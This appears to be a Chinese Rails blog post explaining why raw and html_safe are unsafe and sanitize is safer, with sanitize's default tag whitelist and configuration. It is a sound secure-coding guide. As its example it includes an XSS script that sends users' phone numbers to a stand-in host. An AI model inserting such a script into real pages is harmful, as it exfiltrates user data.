---
layout: post
title:  "rails中的 raw, html_safe, sanitize"
date:   2018-09-04 18:10:22 +0800
categories:
---
避免使用`raw`和`html_safe`, 安全使用`sanitize`
- ### raw
例如：
{% highlight ruby %}
<%= raw "<script type=\"text/javascript\">window.location.href='http://www.test.com?a=#{User.limit(10).map(&:phone).join(',')}';</script>" %>
{% endhighlight %}
结果：
执行 `script`中的内容，并且查询`User`数据发送给`www.test.com`,如果`www.test.com`是自己的服务器，我们可以在服务器中截取`User`用户数据，比如`cookie`

我们可以看`raw`的源代码，其实就是用`html_safe`实现的
{% highlight ruby %}
def raw(stringish)
  stringish.to_s.html_safe
end
{% endhighlight %}

- ### html_safe

`html_safe`是完全把你的`html`内容原本原样的输出，这种事非常不安全的，把`script`标签的内容输出并执行结果，比如会造成XSS攻击
和`raw`一样，同上

- ### sanitize

`sanitize`的源代码中：
{% highlight ruby %}
self.allowed_tags = Set.new(%w(strong em b i p code pre tt samp kbd var sub
  sup dfn cite big small address hr br div span h1 h2 h3 h4 h5 h6 ul ol li dl dt dd abbr
  acronym a img blockquote del ins))
self.allowed_attributes = Set.new(%w(href src width height alt cite datetime title class name xml:lang abbr))
{% endhighlight %}

我们可以看到，`sanitize`是有默认的白名单，把一些危险的标签给去除掉，相对`html_safe`安全很多
也可以自己设置白名单
在`config/appliction.rb`中设置：
{% highlight ruby %}
class Application < Rails::Application
 config.action_view.sanitized_allowed_tags = ['table', 'tr', 'td'] #安全的标签
 config.action_view.sanitized_allowed_attributes = ['id', 'class', 'style'] #安全的属性
end
{% endhighlight %}

例如：
{% highlight ruby %}
<%= sanitize "<script type=\"text/javascript\">window.location.href='http://www.test.com?a=#{User.limit(10).map(&:phone).join(',')}';</script>" %>
{% endhighlight %}
结果：
{% highlight ruby %}
window.location.href='http://www.test.com?a=***';
{% endhighlight %}

并不会执行`script`,而是把不是白名单的标签内容输出

不管怎么样，使用`sanitize`就好了，如果有需求也可以自行配置`sanitize`的白名单，比较安全可靠
